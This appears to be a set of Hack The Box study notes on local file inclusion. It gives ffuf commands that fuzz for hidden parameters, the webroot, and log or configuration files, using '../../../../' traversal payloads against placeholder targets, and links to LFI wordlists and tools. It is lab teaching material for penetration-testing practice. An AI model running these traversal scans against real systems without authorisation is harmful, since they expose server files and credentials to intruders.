## Fuzzing Parameters

Fuzz for common non publicly exposed parameters:
```shell-session
Wildland4958@htb[/htb]$ ffuf -w /SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs <page size to filter>
```

**Tip:** For a more precise scan, we can limit our scan to the most popular LFI parameters found on this [link](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters).

## LFI Wordlists

There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) (Also good for payloads to find server files).

Fuzz a parameter:
```shell-session
Wildland4958@htb[/htb]$ ffuf -w <wordlist location>:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?<parameter>=FUZZ' -fs <page size to filter>
```

## Fuzzing Server Files

### Sever Webroot

Fuzz for the web root, which can let you specify absolute path:
```shell-session
Wildland4958@htb[/htb]$ ffuf -w /SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs <page size to filter>
```

### Server Logs/Configurations

[wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) Will give as more precise results than [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt).

Fuzz for log and configuration files:
```shell-session
Wildland4958@htb[/htb]$ ffuf -w <wordlist>:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs <page size to filter>
```

## LFI Tools

- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
- [liffy](https://github.com/mzfr/liffy)
